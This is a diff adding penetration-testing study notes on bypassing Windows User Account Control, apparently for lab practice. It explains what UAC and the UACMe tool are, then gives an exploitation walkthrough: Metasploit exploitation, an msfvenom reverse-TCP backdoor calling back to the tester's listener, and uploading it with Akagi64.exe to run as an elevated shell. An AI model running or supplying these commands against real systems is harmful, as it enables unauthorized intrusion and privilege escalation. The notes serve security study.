@@ -1,0 +1,64 @@
+UAC (User Account Control) is a Windows security feature introduced in Windows Vista that is used to preevent unauthorized changes from being made to the OS
+
+UAC is used to ensure that changes to the OS require approval from the administrator or a user account that is part of the local administrators group
+
+A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt
+
+Attacks can bypass UAC in order to execute malicious executables with elevated privileges
+
+In order to successfully bypass UAC, we will need to have access to a user account that is part of the local admin group on the Windows target system.
+
+UAC allows a program to be executed with admin privileges, consequently prompting the user for confirmation
+
+UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation
+
+There are multiple tools and techniques that can be used to bypass UAC, however the tool and technique used will depend on the version of Windows running on the target system.
+
+**Admin account with UAC set on default settings is required for UACMe to work**
+
+---------------------------------------------------Tools-------------------------------------------------------------
+
+UACMe is an open source, robust privilege escalation tool. It can be used to bypass Windows UAC by leveraging various techniques.
+
+The UACMe github repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10
+
+It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate Tool
+
+---------------------------------------------------Exploitation--------------------------------------------------------
+
+nmap <ip>
+** identify vulnerability, easy right? **
+service postgresql start && msfconsole (Once you find a lead, use msfconsole to search for payloads and vulnerabilities)
+setg RHOSTS <target ip>
+exploit
+** once you have a meterpreter session you can do some basic local enumeration **
+sysinfo
+pgrep explorer (you can use this to change your meterpreter session to x64 or x86 after you get a meterpreter session)
+migrate 2448 (this will give you x64)
+
+getuid
+getprivs
+shell (will open a command prompt)
+netuser (will list accounts)
+net localgroup administrators
+net user admin password123 (this will likely fail, need to escalate priv and bypass UAC)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<port you want to use to listen on> -f exe > backdoor.exe
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST and LPORT
+run (this starts a listener)
+
+**back on the victim machine meterpreter shell**
+cd C:\\
+mkdir Temp
+cd Temp
+upload backdoor.exe
+upload /root/Desktop.tools/UACME/Akagi64.exe
+shell (to open a command prompt)
+.\Akagi64.exe 23 C:\Temp\backdoor.exe (here we are using key 23 from the UACME github repository which takes advantage of package manager)
+**back on your second msfconsole session used to make the other listener, you should have a elevated shell**
+
+
+ 
